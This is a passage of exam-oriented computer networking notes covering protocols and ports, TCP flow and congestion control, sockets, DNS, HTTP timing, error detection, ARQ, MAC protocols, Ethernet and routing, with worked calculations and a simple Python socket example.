**Common port:** `TCP 22`

Common SSH uses include:

- Remote server administration
- Running commands remotely
- Secure file transfer
- Port forwarding/tunneling
- Git operations over SSH

Example:

```text
Administrator
     ↓
   SSH
     ↓
Remote Server
     ↓
Execute commands securely
```

SSH can authenticate users using passwords or, preferably in many administrative environments, **public-key authentication**.

#### Telnet

Telnet is an older protocol for **remote command-line access**.

**Common port:** `TCP 23`

Unlike SSH, Telnet does **not encrypt the communication**. Usernames, passwords, commands, and other transmitted data can potentially be observed by an attacker who can capture the traffic.

Therefore:

```text
Telnet → Unencrypted → Insecure
SSH    → Encrypted   → Secure alternative
```

Telnet is largely deprecated for remote administration and is generally replaced by SSH.

#### SMTP (Simple Mail Transfer Protocol)

SMTP is used primarily for **sending and relaying email**.

A simplified email flow is:

```text
Email Client
     ↓
SMTP Server
     ↓
Sender Mail Server
     ↓
Recipient Mail Server
```

Common SMTP ports include:

| Port | Common use |
| --: | --- |
| `25` | Server-to-server mail transfer |
| `587` | Mail submission, commonly with authentication |
| `465` | SMTP over implicit TLS in common deployments |

SMTP is primarily a **mail sending/transfer protocol**. It does not normally provide the mechanism used by an email client to retrieve messages from a mailbox.

#### POP3 (Post Office Protocol version 3)

POP3 is an email retrieval protocol used by clients to **download messages from a mail server**.

**Common ports:**

- `110` — POP3
- `995` — POP3 over TLS

POP3 traditionally focuses on downloading messages to the client and can be configured to remove messages from the server after download.

It is useful for simpler email access but provides less flexible synchronization than IMAP.

#### IMAP (Internet Message Access Protocol)

IMAP is an email retrieval and synchronization protocol.

Unlike traditional POP3 usage, IMAP keeps messages on the server and allows clients to synchronize:

- Emails
- Folders
- Read/unread status
- Flags
- Message state

**Common ports:**

- `143` — IMAP
- `993` — IMAP over TLS

IMAP is generally better suited to users who access the same mailbox from **multiple devices**.

#### ICMP (Internet Control Message Protocol)

ICMP is a network-layer control and diagnostic protocol used by IP networks.

It is **not a transport protocol like TCP or UDP**.

ICMP is commonly used for:

- Error reporting
- Network diagnostics
- Reachability testing
- Path troubleshooting

**Ping** uses ICMP Echo Request and Echo Reply messages.

```text
Host A
  │
  │ ICMP Echo Request
  ↓
Host B
  │
  │ ICMP Echo Reply
  ↓
Host A
```

Tools such as `ping` use ICMP to determine whether a destination is reachable and measure round-trip time.

`traceroute`/`tracert` can also use ICMP messages, depending on the operating system and implementation.

#### ARP (Address Resolution Protocol)

ARP is used on IPv4 local networks to determine the **MAC address associated with an IPv4 address**.

For example:

```text
IPv4 address: 192.168.1.20
        ↓
      ARP
        ↓
MAC address: AA:BB:CC:DD:EE:FF
```

A device can send an ARP request asking:

```text
Who has 192.168.1.20?
```

The device owning that IP address responds with its MAC address.

ARP operates within the **local Layer 2 network/broadcast domain**.

> IPv6 does not use ARP. IPv6 uses **Neighbor Discovery Protocol (NDP)** instead.

#### SNMP (Simple Network Management Protocol)

SNMP is used to **monitor and manage network devices** such as:

- Routers
- Switches
- Firewalls
- Servers
- Printers
- Access points

SNMP can provide information such as:

- CPU utilization
- Memory usage
- Interface status
- Interface traffic
- Device uptime
- Error counters

**Common ports:**

- `UDP 161` — SNMP queries/operations
- `UDP 162` — SNMP traps/notifications

A monitoring system can periodically query devices:

```text
Network Monitoring Server
          ↓
       SNMP Query
          ↓
Router / Switch
          ↓
     SNMP Response
          ↓
Network Monitoring Server
```

SNMP versions differ in security capabilities. **SNMPv3** provides significantly stronger security features than older versions.

#### NTP (Network Time Protocol)

NTP synchronizes the clocks of networked devices.

**Common port:** `UDP 123`

Accurate time is important for:

- Log correlation
- Security investigations
- Authentication systems
- Certificates
- Distributed applications
- Scheduled tasks

A simplified NTP hierarchy is:

```text
Reference Time Source
        ↓
   NTP Server
        ↓
 Routers / Servers
        ↓
 Client Devices
```

NTP allows devices to maintain clocks that are closely synchronized with a common time source.

#### Protocol Summary

| Protocol | Purpose | Common Port |
| --- | --- | --: |
| TCP | Reliable transport | Various |
| UDP | Fast connectionless transport | Various |
| HTTP | Web communication | TCP 80 |
| HTTPS | Secure web communication | TCP 443 |
| DNS | Domain name resolution | UDP/TCP 53 |
| DHCP | Automatic IP configuration | UDP 67/68 |
| FTP | File transfer | TCP 21 |
| SFTP | Secure file transfer over SSH | TCP 22 |
| SSH | Secure remote access | TCP 22 |
| Telnet | Unencrypted remote access | TCP 23 |
| SMTP | Sending/relaying email | TCP 25/465/587 |
| POP3 | Email retrieval | TCP 110/995 |
| IMAP | Email retrieval/synchronization | TCP 143/993 |
| ICMP | Diagnostics and network control | No TCP/UDP port |
| ARP | IPv4-to-MAC resolution | No TCP/UDP port |
| SNMP | Network monitoring/management | UDP 161/162 |
| NTP | Time synchronization | UDP 123 |

# TCP In Depth: Header, Sequence Numbers, Connection States, Flow Control and Congestion Control

#### TCP Overview and Header

TCP is **connection-oriented, reliable, full-duplex, point-to-point, byte-stream** delivery between two processes, with flow control and congestion control. It does not support multicast or broadcast.

| Field | Size |
| --- | --- |
| Source port, destination port | 16 bits each |
| Sequence number | 32 bits |
| Acknowledgement number | 32 bits |
| Header length (data offset) | 4 bits, in 32-bit words (5 to 15, so 20 to 60 B) |
| Flags | URG, ACK, PSH, RST, SYN, FIN (plus ECE, CWR, NS) |
| Window (receiver window, rwnd) | 16 bits (maximum 65,535 B without the window-scale option) |
| Checksum | 16 bits, covers header + data + pseudo-header |
| Urgent pointer | 16 bits |
| Options | up to 40 B: MSS, window scale, SACK, timestamps |

**MSS** (maximum segment size) is the maximum **data** in one segment, usually MTU - 40 B (20 B IP + 20 B TCP header), so 1460 B on Ethernet.

#### Sequence and Acknowledgement Numbers

- TCP numbers **bytes**, not segments. A segment's sequence number is the number of its **first data byte**.
- The ACK number is the **next byte expected** (cumulative acknowledgement): ACK = n means all bytes up to n - 1 have been received.
- **SYN and FIN each consume one sequence number.** A pure ACK (no data) consumes none.
- *Example:* the client's first data byte has sequence number 1001. It sends three segments of 500 B with sequence numbers 1001, 1501 and 2001. The server's acknowledgement for all of them is **2501**.
- **Wraparound:** with 32-bit sequence numbers, data sent at rate R wraps after 2^32 / R seconds. To avoid ambiguity with old duplicate segments that live up to T seconds, require **R <= 2^32 bytes / T**. For T = 60 s this is about 71.6 MB/s, about 573 Mbps.

#### Connection Management Details

- **Handshake:** client sends SYN (seq = x), server replies SYN + ACK (seq = y, ack = x + 1), client sends ACK (seq = x + 1, ack = y + 1). Data may ride in the third segment. The initial sequence numbers are chosen randomly or from a clock.
- A **SYN flood** attack fills the server's half-open connection queue. SYN cookies are the defence.
- **Termination:** A sends FIN, B sends ACK (A has finished sending, B may still send: a **half-close**), B sends FIN when done, A sends ACK. The side that sends the final ACK enters **TIME\_WAIT for 2 x MSL** (maximum segment lifetime), so that a lost last ACK can be resent and old segments die out. **RST** aborts a connection.
- **Client states:** CLOSED, SYN\_SENT, ESTABLISHED, FIN\_WAIT\_1, FIN\_WAIT\_2, TIME\_WAIT, CLOSED. **Server states:** CLOSED, LISTEN, SYN\_RCVD, ESTABLISHED, CLOSE\_WAIT, LAST\_ACK, CLOSED.

#### Flow Control

Flow control stops a fast sender from overflowing a slow **receiver**.

- The receiver advertises **rwnd = RcvBuffer - (LastByteRcvd - LastByteRead)** in every ACK.
- The sender keeps **LastByteSent - LastByteAcked <= rwnd**. This is a **sliding window** protocol, with cumulative ACKs.
- **Zero window:** if rwnd = 0 the sender stops, and a **persist timer** makes it send 1-byte probes so that it learns when space opens.
- **Silly window syndrome** (tiny windows or tiny segments, wasting bandwidth). Receiver side fix, **Clark's solution:** do not advertise a window until it is at least min(MSS, half the buffer). Sender side fix, **Nagle's algorithm:** send the first small piece immediately, but buffer further small data until the outstanding data is acknowledged or a full MSS has accumulated.
- **Delayed ACK:** the receiver waits up to about 500 ms, or acknowledges every second full segment, to save ACK traffic.
- **Throughput limited by window = W / RTT.** Link utilisation = min(1, W / (B x RTT)), where B x RTT is the bandwidth-delay product.

*Example.* B = 1 Gbps and RTT = 100 ms give BDP = 10^9 x 0.1 = 10^8 bits = 12.5 MB. With the maximum 65,535 B window, throughput = 65,535 x 8 / 0.1 = about 5.24 Mbps, which is about 0.5% utilisation. This is why the **window scale option** exists. Another example: a 65,535 B window on a 100 Mbps link with RTT 50 ms gives 65,535 x 8 / 0.05 = about 10.49 Mbps (about 10.5% utilisation).

#### Reliable Delivery and Timers

- Lost segments are detected by **timeout (RTO)** or by **three duplicate ACKs** (four identical ACKs in total), which triggers **fast retransmit** without waiting for the timer.
- **RTT estimation:** EstimatedRTT = (1 - alpha) x EstimatedRTT + alpha x SampleRTT (alpha = 1/8). DevRTT = (1 - beta) x DevRTT + beta x |SampleRTT - EstimatedRTT| (beta = 1/4). **RTO = EstimatedRTT + 4 x DevRTT.**
- **Karn's algorithm:** do not take RTT samples from retransmitted segments. After a timeout **double the RTO** (exponential backoff).
- TCP's retransmission behaviour sits between Go-Back-N and Selective Repeat: ACKs are cumulative (like GBN), but out-of-order segments are usually buffered, and SACK allows selective retransmission.

#### Congestion Control

Congestion control protects the **network** (routers' queues) from too much total traffic. The sender keeps a congestion window **cwnd**, and its **actual window = min(cwnd, rwnd)**. The slow-start threshold is **ssthresh**.

- **Slow start:** cwnd starts at 1 MSS and increases by 1 MSS **per ACK**, so it **doubles every RTT** (exponential). It continues until cwnd reaches ssthresh. Reaching a window of W MSS takes about log2(W) RTTs.
- **Congestion avoidance (additive increase):** once cwnd >= ssthresh, increase by **1 MSS per RTT** (about MSS x MSS / cwnd per ACK).
- **On timeout (loss):** ssthresh = cwnd / 2, cwnd = 1 MSS, go back to slow start (both Tahoe and Reno).
- **On 3 duplicate ACKs:** **Tahoe** treats it like a timeout (ssthresh = cwnd / 2, cwnd = 1 MSS). **Reno** does fast retransmit then **fast recovery**: ssthresh = cwnd / 2, cwnd = ssthresh (+ 3 MSS for the three dup ACKs), grows by 1 per extra dup ACK, and on the new ACK sets cwnd = ssthresh and continues in congestion avoidance (linear).
- This pattern is **AIMD** (additive increase, multiplicative decrease). It gives a **sawtooth**: if cwnd peaks at W, it falls to W/2 and climbs by 1 MSS per RTT, so the **average window is 3W/4** and the loss period is W/2 RTTs. Average throughput is about (3/4) x W x MSS / RTT.

**Worked trace (GATE convention).** Initial ssthresh = 8 MSS, cwnd = 1 MSS. Values per RTT: 1, 2, 4, **8** (reaches ssthresh), then 9, 10, 11, 12. A timeout occurs at cwnd = 12, so ssthresh = 12 / 2 = **6**, and cwnd = 1. Next: 1, 2, 4, **6** (slow-start doubling from 4 is capped at ssthresh), 7, 8, and so on. If a Reno 3-dup-ACK happened at cwnd = 12 instead, the next cwnd would be 6, then 7, 8, 9.

| Variant | Note |
| --- | --- |
| Tahoe | Slow start, congestion avoidance, fast retransmit |
| Reno | Adds fast recovery |
| NewReno | Better recovery from multiple losses in one window |
| CUBIC, BBR | Modern high-bandwidth variants (CUBIC is the Linux default) |

#### TCP Exam Traps

- **Flow control = receiver's buffer (rwnd). Congestion control = network capacity (cwnd).** Sender window = min of the two.
- ACK number = next expected byte, not the last received byte. SYN and FIN consume one sequence number.
- After a **timeout** cwnd resets to 1. After 3 dup ACKs in **Reno** cwnd becomes ssthresh (half). Tahoe resets to 1 in both cases.
- In slow start cwnd grows by one MSS per **ACK** (doubling per RTT). In congestion avoidance it grows by one MSS per **RTT**.
- The TCP window maximum is 65,535 B unless window scaling is used. High-BDP links are the standard use case.
- The TCP checksum is mandatory. The UDP checksum is optional in IPv4.

# UDP Details and the Socket API

#### UDP Header

UDP has an **8-byte header**: source port, destination port, length (header + data), checksum. It is connectionless, unreliable, with no flow control, no congestion control and no ordering. It preserves message boundaries. Maximum UDP payload = 65,535 - 20 - 8 = 65,507 B. The UDP checksum is optional in IPv4.

| Feature | TCP | UDP |
| --- | --- | --- |
| Header | 20 to 60 B | 8 B |
| Data unit | Byte stream (no message boundaries) | Datagrams (boundaries kept) |
| Multicast / broadcast | No | Yes |

#### Socket API

A **socket** is the endpoint through which an application sends and receives data. The OS identifies the process using **(IP address, port)**. Port ranges: **0 to 1023 well-known, 1024 to 49151 registered, 49152 to 65535 dynamic (ephemeral)**.

**TCP call sequence**

| Step | Server | Client |
| --- | --- | --- |
| 1 | socket(): create | socket(): create |
| 2 | bind(): attach to an IP and port | (OS picks an ephemeral port automatically) |
| 3 | listen(): mark as passive, set backlog queue |  |
| 4 | accept(): **blocks** until a client connects, **returns a new socket** | connect(): triggers the 3-way handshake |
| 5 | recv() / send() on the new socket | send() / recv() |
| 6 | close() | close() |

```
# TCP server (Python)
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8080))
s.listen(5)
conn, addr = s.accept()
data = conn.recv(1024)
conn.sendall(data.upper())
conn.close()

# TCP client
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('127.0.0.1', 8080))
c.sendall(b'hello')
print(c.recv(1024))
c.close()
```

**UDP** uses socket(SOCK\_DGRAM), bind() on the server, and **sendto() / recvfrom()**. There is no listen(), accept() or connect() (connect() is optional and only sets a default peer).

Key facts:

- The server has a **listening socket** (used only for incoming connection requests) and accept() returns a **new connected socket per client**. A web server on port 80 therefore serves many clients on the same port.
- A **TCP connection is identified by the 4-tuple (source IP, source port, destination IP, destination port)**. A **UDP socket is identified by (destination IP, destination port)** only.
- TCP is a byte stream: one send() may be delivered by several recv() calls, and several send() calls may arrive in one recv(). The application must mark message boundaries.
- The listen() **backlog** limits the queue of pending connections.
- Concurrent servers use fork(), threads, or select() / poll() to multiplex many sockets.
- accept() returns a **new** socket. The listening socket stays open.

# DNS In Depth

#### Hierarchy of Name Servers

DNS is a **distributed, hierarchical database** run by many name servers.

- **Root servers:** 13 logical servers (A to M), each replicated at many sites using anycast. They know the TLD servers.
- **TLD servers:** one set for each top-level domain (.com, .org, .edu, .in). They know the authoritative servers below them.
- **Authoritative servers:** hold the actual records for an organisation's names.
- **Local (default) name server / resolver:** run by the ISP or institution. Hosts send all queries to it, and it does the work and **caches** the answers.

A name is read right to left: in www.cse.example.edu the root is above .edu, and edu is above example, and so on.

#### Additional Record Types

| Type | Meaning |
| --- | --- |
| PTR | IP address to hostname (reverse lookup, in the in-addr.arpa domain) |
| SOA | Start of authority (zone parameters) |

A DNS record is **(Name, Value, Type, TTL)**. TTL controls how long a record may be cached.

#### Recursive vs Iterative Queries

- **Recursive query:** the server must return the final answer (or an error). A host normally sends a recursive query to its local server.
- **Iterative query:** the server returns either the answer or a **referral** to another server. The local server usually queries root, TLD and authoritative servers iteratively.

Typical flow with empty caches: host to local server (recursive), local server to root (referral to .com), to TLD (referral to the authoritative server), to authoritative (A record), then the local server caches the answer and replies. That is 4 query-reply pairs (8 messages). A reply from the authoritative server is an **authoritative answer**. A reply served from a cache is **non-authoritative**.

**Delay calculation:** total DNS time = RTT(host to local server) + sum of RTTs from the local server to each server it contacts. If the answer is cached at the local server, only the first RTT is paid.

#### DNS Message and Transport

The header is **12 bytes**: ID (16 bits, copied from query to reply), flags (16 bits, including QR, AA, TC, RD, RA), and four 16-bit counts (questions, answers, authority records, additional records). Replies larger than 512 B set the TC bit and the query is retried over **TCP**. Zone transfers use TCP.

#### DNS Exam Traps

- DNS usually uses **UDP**, but TCP for zone transfer. Do not say only UDP.
- NS and MX records give **hostnames**, so a matching A record is also needed (normally supplied in the additional section).

# HTTP In Depth

#### Basics

HTTP is a **client-server**, request-response protocol over **TCP port 80** (HTTPS uses TLS on port 443). It is **stateless**: the server keeps no memory of earlier requests, and state is added with **cookies**. A **URL** has the form scheme://host:port/path?query.

#### Message Format

**Request:** request line (METHOD SP URL SP VERSION CRLF), header lines, a **blank line**, then an optional body. **Response:** status line (VERSION SP code SP phrase), header lines, blank line, body.

**Methods:** GET (fetch), HEAD (headers only), POST (send data, may change state), PUT (replace or store), DELETE, OPTIONS, TRACE, CONNECT. **Safe** methods (no state change): GET, HEAD, OPTIONS. **Idempotent** (repeating has the same effect): GET, HEAD, PUT, DELETE, OPTIONS, TRACE. **POST is neither safe nor idempotent.**

**Status codes:**

| Range | Class | Common codes |
| --- | --- | --- |
| 1xx | Informational | 100 Continue |
| 2xx | Success | 200 OK, 201 Created, 204 No Content |
| 3xx | Redirection | 301 Moved Permanently, 302 Found, 304 Not Modified |
| 4xx | Client error | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found |
| 5xx | Server error | 500 Internal Server Error, 503 Service Unavailable |

**Common headers:** Host (mandatory in HTTP/1.1, lets one IP serve many sites), User-Agent, Accept, Connection (keep-alive or close), Content-Length, Content-Type, If-Modified-Since, ETag, Cache-Control, Cookie, Set-Cookie.

#### Non-Persistent vs Persistent Connections (timing questions)

- **Non-persistent (HTTP/1.0 default):** a new TCP connection for **every object**. Each object costs **2 RTT** (1 RTT for the TCP handshake, 1 RTT for request and response) plus its transmission time.
- **Persistent (HTTP/1.1 default):** the connection stays open. After the first object, each further object costs **1 RTT**. **Without pipelining** the client requests the next object only after receiving the previous one. **With pipelining** requests go back to back, so all remaining objects arrive after about **1 RTT**.

For a base page plus n small objects (ignoring transmission time; add DNS time if given):

| Mode | Total time |
| --- | --- |
| Non-persistent, serial | (n + 1) x 2 RTT |
| Non-persistent, p parallel connections | 2 RTT (base) + ceil(n / p) x 2 RTT |
| Persistent, no pipelining | 2 RTT (base) + n x RTT |
| Persistent, with pipelining | 2 RTT (base) + 1 RTT |

*Example.* RTT = 100 ms, base page + 10 objects. Non-persistent serial: 11 x 200 = 2.2 s. Persistent without pipelining: 200 + 10 x 100 = 1.2 s. Persistent with pipelining: 200 + 100 = 0.3 s. **HTTP/2** multiplexes many streams over one connection and compresses headers. **HTTP/3** runs over QUIC (on UDP).

#### HTTP Cookies (the four components)

(1) a **Set-Cookie** header in the response, (2) a **Cookie** header in later requests, (3) a cookie file kept on the user's computer and managed by the browser, (4) a **back-end database** at the website. Uses: login sessions, shopping carts, tracking.

#### Web Caching (Proxy Server)

A proxy cache returns a stored copy on a hit and otherwise fetches from the origin server and stores the object. A **conditional GET** (If-Modified-Since) lets the cache check freshness: the server replies **304 Not Modified** with no body if the copy is current. **Average delay = h x d\_cache + (1 - h) x d\_origin**, where h is the hit rate. Traffic on the access link falls to (1 - h) of the original.

#### HTTP Exam Traps

- HTTP is stateless. Cookies, not HTTP itself, remember the user.
- Count 2 RTT per object only for non-persistent connections.
- 304 has no message body. 404 is a client error, 500 a server error.

# Switches and Routers

#### Switch

A Layer 2 device that connects devices within the same LAN, forwarding frames based on MAC addresses. Learns MAC addresses via the CAM table and forwards traffic intelligently, unlike a hub which broadcasts to all ports.

**Layer 3 Switch**: Adds routing capability, can perform both switching and basic inter-VLAN routing.

#### Router

A Layer 3 device that connects different networks and forwards packets based on IP addresses, using a routing table to determine the best path.

### Switch vs Router

| Switch | Router |
| --- | --- |
| Layer 2 (some Layer 3) | Layer 3 |
| Connects devices within a LAN | Connects different networks |
| Uses MAC addresses | Uses IP addresses |
| Uses CAM table | Uses routing table |

# MAC Address

A 48-bit (6-byte) physical address burned into a network interface card (NIC), written in hexadecimal (e.g., 00:1A:2B:3C:4D:5E).

#### Structure

- First 24 bits (OUI - Organizationally Unique Identifier): Identifies the manufacturer.
- Last 24 bits: Unique identifier assigned by the manufacturer.

#### Key Points

- Operates at Layer 2 (Data Link)
- Unique globally (in theory)
- Can be spoofed via software
- Unlike IP addresses, MAC addresses don't change when a device moves networks

# CAM Table

The Content Addressable Memory (CAM) table is used by switches to map MAC addresses to physical switch ports.

#### How It Works

1. Switch receives a frame and inspects the source MAC address.
2. It records that MAC-to-port mapping in the CAM table.
3. For the destination, it checks the CAM table; if found, forwards only to that port; if not found, floods the frame to all ports except the incoming one.

#### CAM Table Overflow Attack

An attacker floods a switch with fake MAC addresses to exhaust CAM table memory, forcing it to flood all traffic to every port (acting like a hub), enabling packet sniffing. Mitigated with port security.

# Data Link Layer: Framing, Error Detection and Flow Control (ARQ)

#### Services of the Data Link Layer

Framing, hop-to-hop reliable delivery, error detection (and sometimes correction), flow control, and medium access control (for shared links). Sub-layers: **LLC** and **MAC**.

#### Framing

The receiver needs to know where frames start and end.

- **Character count:** a length field at the start. Breaks if the count is corrupted.
- **Flag bytes with byte stuffing:** a flag byte marks the boundary. If the flag (or the escape byte) appears in the data, an **ESC byte is inserted before it**.
- **Flag bits with bit stuffing:** the flag is 01111110. The sender inserts a **0 after every five consecutive 1s** in the data. The receiver removes a 0 that follows five 1s. Example: data 0111111011111 becomes 011111010111110. The worst case is all 1s, needing 1 extra bit per 5 data bits (20% overhead).
- **Physical layer coding violations** are used in some encodings.

#### Error Detection and Correction

- **Single parity bit** detects any **odd** number of bit errors and fails for an even number. **2-D parity** detects all 1, 2 and 3-bit errors and corrects any single-bit error.
- **Internet checksum** (IP header, TCP, UDP, ICMP): add the data as 16-bit words using one's complement arithmetic (carry out of the top is added back at the bottom), then complement the sum. The receiver adds everything including the checksum and the result must be all 1s. *8-bit example:* 10110011 (179) + 01100101 (101) = 280, wrap the carry to get 00011001 (25), complement gives 11100110 (230). Receiver: 179 + 101 + 230 = 510, wrap the carry to get 11111111, so no error.
- **CRC:** choose a generator G of r + 1 bits (degree r). Append **r zeros** to the data, divide by G using **modulo-2 (XOR) division**, and the r-bit remainder is the CRC, transmitted after the data. The receiver divides the whole frame by G and a **zero remainder** means no detected error. *Example:* data 1101011111, G = 10011 (r = 4): dividend 11010111110000, remainder 0010, frame 11010111110010. Another: data 1001 with G = 1011 gives remainder 110 and frame 1001110.
- CRC guarantees: detects **all single-bit errors** if G has at least two terms and a non-zero constant term; detects **all burst errors of length <= r** (a burst of length r + 1 escapes with probability 1/2^(r-1), longer bursts with 1/2^r); detects **all odd numbers of errors** if G is divisible by (x + 1), meaning an even number of 1s in G. Ethernet uses **CRC-32** (4-byte FCS).
- **Hamming code:** for m data bits the number of parity bits r satisfies **2^r >= m + r + 1**, with parity bits at positions 1, 2, 4, 8, and so on. **Hamming distance** d between codewords is the number of differing bit positions. A code with minimum distance d **detects up to d - 1 errors** and **corrects up to floor((d - 1) / 2) errors**. Standard Hamming codes have d = 3.

#### Flow Control and ARQ Protocols

Notation: Tt = frame transmission time, Tp = propagation time, **a = Tp / Tt**. Ignore ACK time unless stated. Stop-and-wait cycle time = Tt + 2 x Tp.

| Protocol | Sender window | Receiver window | Sequence numbers needed | Efficiency (no errors) |
| --- | --- | --- | --- | --- |
| Stop-and-wait | 1 | 1 | 2 (1 bit) | 1 / (1 + 2a) |
| Go-Back-N (GBN) | N | 1 | N + 1 minimum (N <= 2^k - 1) | N / (1 + 2a), capped at 1 |
| Selective Repeat (SR) | N | N | 2N minimum (N <= 2^(k-1)) | N / (1 + 2a), capped at 1 |

- **Throughput = efficiency x bandwidth.** **Window for 100% utilisation:** N = 1 + 2a, rounded up.
- **GBN:** cumulative ACKs. On a loss or timeout the sender resends that frame and **all frames after it**. The receiver discards out-of-order frames, so it needs no buffer.
- **SR:** the receiver buffers out-of-order frames and acknowledges each frame individually. Only the lost frame is resent.
- With frame error probability p, stop-and-wait efficiency is roughly (1 - p) / (1 + 2a). **Piggybacking:** the ACK rides inside the next data frame going the other way.

**Worked example.** Frames are 1000 B, link is 1 Mbps, one-way propagation 25 ms. Tt = 8 ms, a = 3.125. Stop-and-wait efficiency = 1 / 7.25 = about 13.8%, throughput about 138 Kbps. Window for 100% = 1 + 2a = 7.25, so 8 frames. GBN needs 9 sequence numbers (**4 bits**). SR needs 16 (**4 bits**). Another: 2 Mbps, 1000-bit frames, one-way delay 10 ms gives a = 20, efficiency 1/41 = 2.4%, window 41, GBN needs 6 bits and SR needs 7 bits.

#### Data Link Exam Traps

- Bit stuffing inserts after five 1s, and the flag has six 1s.
- Parity cannot detect an even number of errors. CRC with a good generator can.
- GBN window must be at most 2^k - 1, SR window at most 2^(k-1). Do not mix them up.
- Convert frame size in bytes and bandwidth in bits per second before computing Tt.

# Medium Access Control (MAC) Protocols

When many stations share one channel, the MAC protocol decides who may transmit. Families: **channel partitioning** (TDMA, FDMA, CDMA), **random access** (ALOHA, CSMA, CSMA/CD, CSMA/CA) and **taking turns** (token ring, polling).

**Pure ALOHA:** send whenever a frame is ready. The **vulnerable time = 2 x Tfr**. With G = average frames generated per frame time, **S = G x e^(-2G)**, maximum **S = 1/(2e) = about 0.184** at G = 0.5. *Example:* on a 1 Mbps channel at G = 0.5 the throughput is about 184 Kbps.

**Slotted ALOHA:** frames start only at slot boundaries. **Vulnerable time = Tfr**. **S = G x e^(-G)**, maximum **S = 1/e = about 0.368** at G = 1.

**CSMA** (listen before sending). Collisions still happen because of propagation delay. **1-persistent:** transmit immediately when idle, and keep sensing when busy. **Non-persistent:** if busy, wait a random time then sense again. **p-persistent (slotted):** when idle, transmit with probability p, else wait one slot.

**CSMA/CD (Ethernet, wired, half-duplex)**

1. Sense the carrier. If idle, transmit.
2. **Keep listening while transmitting.** On a collision, stop and send a **jam signal** (32 to 48 bits).
3. Wait using **binary exponential backoff**: after the n-th collision pick K at random from {0, 1, ..., 2^n - 1} (n capped at 10) and wait K x slot time, where **slot time = 512 bit times** (51.2 microseconds at 10 Mbps). Give up after 16 attempts.
4. After the first collision K is 0 or 1, so two colliding stations collide again with probability 1/2.

**Minimum frame size rule.** The sender must still be transmitting when a collision signal returns from the farthest station, so **Tt >= 2 x Tp**, which gives **L\_min = 2 x Tp x B** (equivalently a <= 0.5). The maximum network length is d = (L x v) / (2 x B). *Example:* B = 10 Mbps and one-way Tp = 25.6 microseconds gives L\_min = 512 bits = 64 bytes. *Example:* a 1 Gbps network 1 km long with v = 2 x 10^8 m/s has Tp = 5 microseconds, so L\_min = 10,000 bits = 1250 bytes. **Efficiency of CSMA/CD** is about 1 / (1 + 6.44a) in many GATE solutions (Tanenbaum's version is 1 / (1 + 2ea) = 1 / (1 + 5.44a)). Use the formula given in the question if there is one.

**CSMA/CA (Wi-Fi, IEEE 802.11):** wireless stations cannot listen while sending, and the **hidden terminal problem** means a sender may not hear a competitor. A station waits for the channel to be idle for **DIFS**, then counts down a random backoff. The receiver replies with an ACK after the shorter gap **SIFS**. Optional **RTS/CTS**: the CTS tells hidden stations to defer (the NAV timer). It avoids collisions rather than detecting them.

**Token ring:** a token circulates and only the holder may send, so there are no collisions. With a = Tp / Tt and N stations, efficiency is about 1 / (1 + a/N) for early token release and 1 / (1 + (N + 1) x a / N) for delayed token release.

#### MAC Exam Traps

- Vulnerable time: pure ALOHA 2 x Tfr, slotted ALOHA 1 x Tfr. Maximum throughput 18.4% vs 36.8%.
- Minimum frame size uses the round-trip propagation time: L\_min = 2 x Tp x B (use one-way Tp, then double it).
- Backoff range after n collisions is 0 to 2^n - 1 slots, not 1 to 2^n.

# Ethernet (IEEE 802.3): Frame Format and Switching Details

**Frame format** (bytes): Preamble 7, SFD 1, Destination MAC 6, Source MAC 6, Type/Length 2, Payload 46 to 1500, FCS 4.

- Preamble is 7 bytes of 10101010 for clock sync. SFD is 10101011 and marks the frame start. Neither counts as part of the frame size.
- **Minimum frame = 64 B** (6 + 6 + 2 + 46 + 4). **Maximum frame = 1518 B** (14 + 1500 + 4). Payload below 46 B is **padded**.
- Type/Length: a value of 1536 or more is an EtherType (0x0800 IP, 0x0806 ARP), and 1500 or less is a length.
- **MAC address detail:** if the least significant bit of the first byte is 1 it is a multicast. **Broadcast = FF:FF:FF:FF:FF:FF.**
- **Efficiency:** with preamble + SFD (8 B), header + FCS (18 B) and a 12 B inter-frame gap, overhead is 38 B per frame. For a 1500 B payload, efficiency = 1500 / 1538 = about 97.5%.

**Physical variants.** 10BASE5 (thick coax, 500 m segments), 10BASE2 (thin coax, 185 m), 10BASE-T (twisted pair, star topology via hub, 100 m), 100BASE-TX (Fast Ethernet), 1000BASE-T (Gigabit). Classic 10 Mbps Ethernet uses **Manchester encoding**, so the baud rate is **twice** the bit rate (20 Mbaud). Fast Ethernet uses 4B/5B. Half-duplex Gigabit Ethernet uses carrier extension to keep a 512 B slot.

**Learning switch (transparent bridge):** (1) **Learn:** record (source MAC, incoming port) with an ageing timer. (2) **Forward:** if the destination is on the same port the frame arrived on, **filter** it, and if it is known on another port send it only there. (3) **Flood:** if the destination is unknown or is a broadcast or multicast, send out all ports except the incoming one. Switch ports in **full-duplex** mode have no collisions, so CSMA/CD and the 64 B minimum are not needed for correctness.

**Ethernet exam traps:** a switch has one collision domain per port but still one broadcast domain. A hub is one collision domain. Minimum payload is 46 B, minimum frame 64 B.

# Routing and Routing Protocols

#### Routing

The process of selecting a path for traffic to travel across networks, performed by routers using a routing table containing destination networks, next-hop addresses, and metrics.

#### Static Routing

Manually configured routes. Simple, predictable, but doesn't adapt to network changes and doesn't scale well.

#### Dynamic Routing

Routers automatically learn and share routes using routing protocols, adapting to topology changes.

#### Interior Gateway Protocols (IGP) - within an autonomous system

- **RIP (Routing Information Protocol)**: Distance-vector, uses hop count (max 15 hops), simple but slow to converge.
- **OSPF (Open Shortest Path First)**: Link-state protocol, uses cost based on bandwidth, fast convergence, widely used in enterprises.
- **EIGRP (Enhanced Interior Gateway Routing Protocol)**: Cisco-proprietary (now partially open), hybrid distance-vector, fast convergence.

#### Exterior Gateway Protocol

- **BGP (Border Gateway Protocol)**: Path-vector protocol used between autonomous systems; the protocol that runs the internet's backbone routing.

#### Routing Metrics

Values used to determine the best path, such as hop count, bandwidth, delay, load, and reliability.

#### Administrative Distance

A value indicating the trustworthiness of a routing source; lower is more preferred (e.g., directly connected = 0, static = 1, OSPF = 110, RIP = 120).

# Distance Vector and Link State Routing In Depth

#### Forwarding vs Routing

